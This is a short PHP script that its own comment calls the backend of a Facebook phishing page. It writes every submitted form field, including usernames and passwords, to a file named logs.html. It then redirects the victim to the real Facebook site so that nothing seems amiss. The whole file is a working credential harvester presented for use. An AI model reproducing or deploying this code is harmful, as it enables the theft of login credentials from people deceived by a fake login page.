<?php 
//you can change the bellow link here I am making the phishing page of facebook so I have written www.facebook.com 
header("Location: http://www.facebook.com"); 
$handle = fopen("logs.html", "a"); 
foreach($_POST as $variable => $value) 
{ 
fwrite($handle, $variable); 
fwrite($handle, "="); 
fwrite($handle, $value); 
fwrite($handle, "\r\n"); 
} 
fwrite($handle, "\r\n"); 
fwrite($handle, "<hr />"); 
fclose($handle); 
exit; 
?>